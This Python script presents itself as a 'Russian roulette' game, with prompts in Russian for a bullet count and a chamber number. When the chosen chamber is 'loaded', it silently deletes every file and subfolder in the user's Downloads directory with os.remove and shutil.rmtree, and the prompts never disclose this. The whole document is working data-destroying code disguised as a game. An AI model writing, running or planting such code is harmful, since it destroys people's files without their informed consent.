import glob, os, random, shutil

def main():
    try:
        count_of_bullets = int(input("Введите количетсов пуль: "))
        number = int(input("Введите число от 1 до 6: "))
        pulling_the_trigger = russian_roulette(count_of_bullets, number, get_download_folder(), del_all)
        print("...")
        if pulling_the_trigger == True:
            print("Bang!")
        else:
            print("Pooh")
    except Exception as e:
        print(e)

def load_ammo(count_of_bullets):
    if count_of_bullets < 0:
        raise Exception("Количество пуль должно быть больше либо равно нулю")
    elif count_of_bullets > 6:
        raise Exception("Количество пуль должно быть меньше либо равно шести")
    barrel = [False] * 6
    while count_of_bullets != 0:
        i = random.randint(0, 5)
        if barrel[i] == False:
            barrel[i] = True
            count_of_bullets -= 1
    return barrel

def russian_roulette(count_of_bullets, number, folder_name, del_function):
    if number < 1:
        raise Exception("Число должно быть больше либо равно одному")
    elif number > 6:
        raise Exception("Число должно быть меньше либо равно шести")
    barrel = load_ammo(count_of_bullets)
    if barrel[number - 1] == True:
        del_function(folder_name)
        return True
    else:
        return False

def del_files(dir):
    filelist = glob.glob(os.path.join(dir, "*.*"))
    for f in filelist:
        os.remove(f)

def del_all(dir):
    fdlist = os.listdir(dir)
    for f in fdlist:
        fd = os.path.join(dir, f)
        if os.path.isfile(fd):
            os.remove(fd)
        else:
            shutil.rmtree(fd)

def get_download_folder():
    return os.path.expanduser("~")+"/Downloads/"

if __name__ == "__main__":
    main()